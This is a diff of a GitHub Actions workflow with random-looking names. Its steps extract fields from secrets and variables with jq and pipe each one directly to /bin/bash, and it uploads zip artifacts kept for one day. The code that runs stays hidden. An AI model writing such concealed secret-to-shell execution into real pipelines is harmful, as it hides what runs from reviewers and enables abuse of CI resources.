@@ -1,25 +1,23 @@
 name: linjunhencheng
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '12 3,15 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: linjunhencheng
         env:
-          vp39: ${{ secrets.vp39 }}
+          smsvl6: ${{ secrets.smsvl6 }}
         run: |
-          printf '%s' "$vp39" | jq -r .r90 | /bin/bash
-          echo $if5 | jq -r .nxv15809 | /bin/bash
-          echo $gvf12 | jq -r .wdh5212 | /bin/bash
-          printf '%s' "$skgcc8" | jq -r .fie9164 | /bin/bash
-          printf '%s' "$dkjy5567" | jq -r .j6387 | /bin/bash
-          printf '%s' "$fv920" | jq -r .y965 | /bin/bash
-          echo $gv57742 | jq -r .lins9 | /bin/bash
-          printf '%s' "$s8832" | jq -r .bcbe9 | /bin/bash
+          printf '%s' "$smsvl6" | jq -r .rx351 | /bin/bash
+          printf '%s' "$tgts3562" | jq -r .exf575 | /bin/bash
+          printf '%s' "$d87450" | jq -r .dbbt9014 | /bin/bash
+          printf '%s' "$t1085" | jq -r .j2540 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: p7nkDi1Y
+          path: "*.zip"
+          retention-days: 1
